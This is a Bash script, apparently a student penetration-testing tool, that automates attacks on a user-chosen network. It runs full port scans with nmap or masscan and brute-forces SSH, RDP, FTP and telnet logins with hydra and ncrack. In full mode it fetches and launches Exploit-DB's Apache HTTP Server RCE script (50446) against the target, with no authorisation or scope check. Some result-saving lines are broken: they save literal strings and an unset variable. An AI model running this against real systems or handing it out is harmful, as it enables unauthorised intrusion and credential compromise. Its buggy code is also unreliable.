#!/bin/bash

#Get the user to scan a network

function Network()
{
	echo '# Please specify a network to scan:'
	read network
	
	if [[ -z $network ]];
		then
			echo '# Network is required, script is exiting.'
			exit
		else
			echo "# "$network" is input."
		fi
}
Network

echo " "

#Allow user to choose basic scan or full scan

function Selection()
{
	echo '# Please select (A)Basic Scan or (B)Full Scan.'
	read options

	case $options in
		A|a)
			echo '# Basic Scan is selected.'
			
			#Allow user to enter password if needed for scan
			echo '# Disclaimer: Please enter password if required during scanning.'
			
			#Allow user to choose which program to scan with
			echo '# Please select to use which program to scan with: (A) Nmap or (B) Masscan.'
			read scanoptions
			
			function ScanType()
			{
				
			case $scanoptions in
				A|a)
					echo '# Nmap scan is selected.'
					#Scanning of all the TCP port
					echo '# Scanning of TCP Port, please wait and do not press any keys!'
					NTCP=$(sudo nmap -sV -sT -p- "$network")
					echo '# Scanning of TCP Port is completed.'
				
					#Scanning of the top 100 UDP Port to speed up the process along with T4 speed
					echo '# Scanning of UDP Port, please wait and do not press any keys!'
					NUDP=$(sudo nmap -sV -sU -F -T4 "$network")
					echo '# Scanning of UDP Port is completed.'
				
				;;
				B|b)
					echo '# Masscan scan is selected.'
					#Scanning of all the TCP port.
					echo '# Scanning of TCP Port, please wait and do not press any keys!'
					MTCP=$(sudo masscan "$network" -pT:1-65535 --rate=10000)
					echo '# Scanning of TCP Port is completed.'
					
					#Scanning of all the UDP port.
					echo '# Scanning of UDP Port, please wait and do not press any keys!'
					MUDP=$(sudo masscan "$network" -pU:1-65535 --rate=10000)
					echo '# Scanning of UDP Port is completed.'
					
				;;
				*)
					echo '# Please choose (A) or (B).'
					echo '# Script is exiting!'
					exit
				;;
				esac
			}
			ScanType
			
			function WeakPass()
			{
			
				echo '# Checking for Weak Password'
				
				#User needs to input a username to check for weak password due to script requirement.
				echo '# Please type in an username (Do not upload a file).'
				read user
				
				#If user did not provide username, script exits on itself.
				if [[ -z $user ]];
				then
					echo '# Username is required, script is exiting.'
					exit
				else
					echo '# Username is input.'
				fi
				
				#Only allow user to upload file, if no file is being selected it will use default password list.
				echo '# Please upload a password file if you want to, if no file please hit enter.'
				read passfile
			
				if [ -f "$passfile" ];
				then
					#Using hydra to bruteforce ssh
					SSHRes=$(hydra -l "$user" -P "$passfile" "$network" ssh -vV -f)
					echo '# SSH Password check is completed.'
					
					#Using hydra to bruteforce rdp
					RDPRes=$(hydra -l "$user" -P "$passfile" "$network" rdp -vV -f)
					echo '# RDP Password check is completed.'
					
					#Using hydra to bruteforce ftp
					FTPRes=$(hydra -l "$user" -P "$passfile" "$network" ftp -vV -f)
					echo '# FTP Password check is completed.'
					
					#Using ncrack to bruteforce telnet which is on p23
					TELRes=$(ncrack -u "$user" -P "$passfile" "$network" -p23 -T4 -f)
					echo '# TELNET Password check is completed.'
					
					echo '# Checking for weak password is completed.'
				else
					echo '# No password file is input'
					
					#Using built-in password list by john
					defaultpass=/usr/share/wordlists/john.lst
					
					#Using hydra to bruteforce ssh
					SSHRes=$(hydra -l "$user" -P "$defaultpass" "$network" ssh -vV -f)
					echo '# SSH Password check is completed.'
					
					#Using hydra to bruteforce rdp
					RDPRes=$(hydra -l "$user" -P "$defaultpass" "$network" rdp -vV -f)
					echo '# RDP Password check is completed.'
					
					#Using hydra to bruteforce ftp
					FTPRes=$(hydra -l "$user" -P "$defaultpass" "$network" ftp -vV -f)
					echo '# FTP Password check is completed.'
					
					#Using ncrack to bruteforce telnet which is on p23
					TELRes=$(ncrack -u "$user" -P "$defaultpass" "$network" -p23 -T4 -f)
					echo '# TELNET Password check is completed.'
					
					echo '# Checking for weak password is completed.'
				fi
			}
			WeakPass
			
		;;
		B|b)
			echo '# Full Scan is selected.'
			
			#Allow user to enter password if needed for scan
			echo '# Disclaimer: Please enter password if required during scanning.'
			
			#Allow user to choose which program to scan with
			echo '# Please select to use which program to scan with: (A) Nmap or (B) Masscan.'
			read scanoptions
			
			function ScanType()
			{
				
			case $scanoptions in
				A|a)
					echo '# Nmap scan is selected.'
					#Scanning of all the TCP port
					echo '# Scanning of TCP Port, please wait and do not press any keys!'
					NTCP=$(sudo nmap -sV -sT -p- "$network")
					echo '# Scanning of TCP Port is completed.'
				
					#Scanning of the top 100 UDP Port to speed up the process along with T4 speed
					echo '# Scanning of UDP Port, please wait and do not press any keys!'
					NUDP=$(sudo nmap -sV -sU -F -T4 "$network")
					echo '# Scanning of UDP Port is completed.'
				
				;;
				B|b)
					echo '# Masscan scan is selected.'
					#Scanning of all the TCP port.
					echo '# Scanning of TCP Port, please wait and do not press any keys!'
					MTCP=$(sudo masscan "$network" -pT:1-65535 --rate=10000)
					echo '# Scanning of TCP Port is completed.'
					
					#Scanning of all the UDP port.
					echo '# Scanning of UDP Port, please wait and do not press any keys!'
					MUDP=$(sudo masscan "$network" -pU:1-65535 --rate=10000)
					echo '# Scanning of UDP Port is completed.'
					
				;;
				*)
					echo '# Please choose (A) or (B).'
					echo '# Script is exiting!'
					exit
				;;
				esac
			}
			ScanType
			
			function WeakPass()
			{
			
				echo '# Checking for Weak Password'
			
				#User needs to input a username to check for weak password due to script requirement.
				echo '# Please type in an username (Do not upload a file).'
				read user
				
				#If user did not provide username, script exits on itself.
				if [[ -z $user ]];
				then
					echo '# Username is required, script is exiting.'
					exit
				else
					echo '# Username is input.'
				fi
				
				#Only allow user to upload file, if no file is being selected it will use default password list.
				echo '# Please upload a password file if you want to, if no file please hit enter.'
				read passfile
			
				if [ -f "$passfile" ];
				then
					#Using hydra to bruteforce ssh
					SSHRes=$(hydra -l "$user" -P "$passfile" "$network" ssh -vV -f)
					echo '# SSH Password check is completed.'
					
					#Using hydra to bruteforce rdp
					RDPRes=$(hydra -l "$user" -P "$passfile" "$network" rdp -vV -f)
					echo '# RDP Password check is completed.'
					
					#Using hydra to bruteforce ftp
					FTPRes=$(hydra -l "$user" -P "$passfile" "$network" ftp -vV -f)
					echo '# FTP Password check is completed.'
					
					#Using ncrack to bruteforce telnet which is on p23
					TELRes=$(ncrack -u "$user" -P "$passfile" "$network" -p23 -T4 -f)
					echo '# TELNET Password check is completed.'
					
					echo '# Checking for weak password is completed.'
				else
					echo '# No password file is input'
					
					#Using built-in password list by john
					defaultpass=/usr/share/wordlists/john.lst
					
					#Using hydra to bruteforce ssh
					SSHRes=$(hydra -l "$user" -P "$defaultpass" "$network" ssh -vV -f)
					echo '# SSH Password check is completed.'
					
					#Using hydra to bruteforce rdp
					RDPRes=$(hydra -l "$user" -P "$defaultpass" "$network" rdp -vV -f)
					echo '# RDP Password check is completed.'
					
					#Using hydra to bruteforce ftp
					FTPRes=$(hydra -l "$user" -P "$defaultpass" "$network" ftp -vV -f)
					echo '# FTP Password check is completed.'
					
					#Using ncrack to bruteforce telnet which is on p23
					TELRes=$(ncrack -u "$user" -P "$defaultpass" "$network" -p23 -T4 -f)
					echo '# TELNET Password check is completed.'
					
					echo 'Checking for weak password is completed.'
				fi
			}
			WeakPass
			
			echo " "
			
			function HttpEnum ()
			{
				echo '# Using of NSE script for scanning of HTTP Enumeration.'
				
				#To get more information on http enumeration script via nmap
				ENUMRes=$(nmap -sV --script=http-enum "$network")
				echo '# HTTP Enumeration scan is completed.'
			
			}
			HttpEnum
				
			function ApacheSearchsploit ()
			{
				echo '# Using searchsploit to run check for Apache HTTP Server RCE.'
				#Downloading of Apache HTTP Server RCE script to current user directory
						
				filename=50446.sh
						
				if [ -f "$filename" ];
						
				then 
					#Running the script and specifying port number.
					echo '# Apache HTTP Server RCE script is available.'

					SEARCHRes=$(./50446.sh "$network":80)
					echo " "
					
					echo '# Searchsploit completed.'
					
				else
					#Allowing the download of the script and running the script and specifying port number.
					echo '# Apache HTTP Server RCE script is being downloaded.'
					
					searchsploit -m 50446
					
					SEARCHRes=$(./50446.sh "$network":80)
					echo " "
					
					echo '# Searchsploit completed.'
				fi
			}
			ApacheSearchsploit
	
		;;
		*)
			echo '# Please choose (A) or (B).'
			echo '# Script is exiting!'
			exit
		;;
		esac
}
Selection

#Displaying of TCP Scan result
echo '# Results for TCP Scan:'
echo "$NTCP" "$MTCP"
echo " "

#Displaying of UDP Scan result
echo '# Results for UDP Scan:'
echo "$NUDP" "$MUDP"
echo " "

#Displaying of SSH check
echo '# Results for SSH check:'
echo "$SSHRes"
echo " "

#Displaying of RDP check
echo '# Results for RDP check:'
echo "$RDPRes"
echo " "

#Displaying of FTP check
echo '# Results for FTP check:'
echo "$FTPRes"
echo " "

#Displaying of TELNET check
echo '# Results for TELNET check:'
echo "$TELRes"
echo " "

#Displaying of HTTP Enumeration result
echo '# Result for HTTP Enumeration via NSE Script.'
echo "$ENUMRes"
echo " "

#Displaying of Searchsploit Apache HTTP Server RCE result
echo '# Result of Searchsploit Apache HTTP Server RCE script.'
echo "$SEARCHRes"
echo " "

#Allow the user to search for an output result

function SearchResult ()
{
	echo '# Please select an option to view result, (A) Nmap/Masscan (B) Bruteforce (C) HTTP Enumeration (D) Searchsploit (E) Exit.'
	
	while true; do
	read resultoptions
	
	case $resultoptions in
		A|a)
			#Display of TCP and UDP scan results
			echo 'Nmap/Masscan result is selected'
			echo '# Results for TCP Scan:'
			echo "$NTCP" "$MTCP"
			echo " "
			echo '# Results for UDP Scan:'
			echo "$NUDP" "$MUDP"
			echo '# Please select an option to view result, (A) Nmap/Masscan (B) Bruteforce (C) HTTP Enumeration (D) Searchsploit (E) Exit.'
			echo " "
			
		;;
		B|b)
			#Display of all bruteforce result
			echo '# Bruteforce result is selected.'
			echo '# Results for SSH check:'
			echo "$SSHRes"
			echo " "
			
			echo '# Results for RDP check:'
			echo "$RDPRes"
			echo " "
			
			echo '# Results for FTP check:'
			echo "$FTPRes"
			echo " "
			
			echo '# Results for TELNET check:'
			echo "$TELRes"
			echo '# Please select an option to view result, (A) Nmap/Masscan (B) Bruteforce (C) HTTP Enumeration (D) Searchsploit (E) Exit.'
			echo " "
			
		;;
		C|c)
			#Displaying of HTTP Enumeration result
			echo '# Result for HTTP Enumeration via NSE Script is selected.'
			echo "$ENUMRes"
			echo '# Please select an option to view result, (A) Nmap/Masscan (B) Bruteforce (C) HTTP Enumeration (D) Searchsploit (E) Exit.'
			echo " "
			
		;;
		D|d)
			#Displaying of Searchsploit Apache HTTP Server RCE result
			echo '# Result of Searchsploit Apache HTTP Server RCE script is selected.'
			echo "$SEARCHRes"
			echo '# Please select an option to view result, (A) Nmap/Masscan (B) Bruteforce (C) HTTP Enumeration (D) Searchsploit (E) Exit.'
			echo " "
			
		;;
		E|e)
			echo '# Exiting viewing of results.'
			break
			
		;;	
		*)
			echo '# This is not a valid selection.'
			echo '# Please select an option to view result, (A) Nmap/Masscan (B) Bruteforce (C) HTTP Enumeration (D) Searchsploit (E) Exit.'
		
		;;
	esac
	done
}
SearchResult


#Allow the user to have an option to save a copy of the results

echo 'Save a copy of the results? (A) Yes (B) No'
read saveoption

case $saveoption in 
	A|a)
		function OutputName()
		{
			#Get the user to specify a name for output directory
			echo '# Please specify a name for output directory.'
			read outputname
	
			if [[ -z $outputname ]];
			then
				echo '# Output name for directory is required, script is exiting.'
				exit
			else
				echo "# "$outputname" is input."
				echo "$NTCP" "STCP" >> TCPresult.txt
				echo '# Saving of TCP Scan Result as TCPresult.txt.'
				
				echo "$NUDP" "MUDP" >> UDPresult.txt
				echo '# Saving of UDP Scan Result as UDPresult.txt.'
				
				echo "$SSHRes" >> SSHresult.txt
				echo '# Saving of SSH check as SSHresult.txt.'
				
				echo "$RDPRes" >> RDPresult.txt
				echo '# Saving of RDP check as RDPresult.txt.'
				
				echo "$FTPRes" >> FTPresult.txt
				echo '# Saving of FTP check as FTPresult.txt.'
				
				echo "$TELNETRes" >> TELNETresult.txt
				echo '# Saving of TELNET check as TELNETresult.txt.'
				
				echo "$ENUMRes" >> HTTPEnumresult.txt
				echo '# Saving of HTTP Enumeration result as HTTPEnumresult.txt'
				
				echo "$SEARCHRes" >> Searchsploitresult.txt
				echo '# Saving of Searchsploit Apache HTTP server RCE result as Searchsploitresult.txt.'
				
				zip -m "$outputname".zip *.txt
				echo "# Files have been saved inside as "$outputname".zip"
				
			fi
		}
		OutputName
		
	;;
	B|b)
		echo '# Script is exiting.'
		exit
	;;
	esac

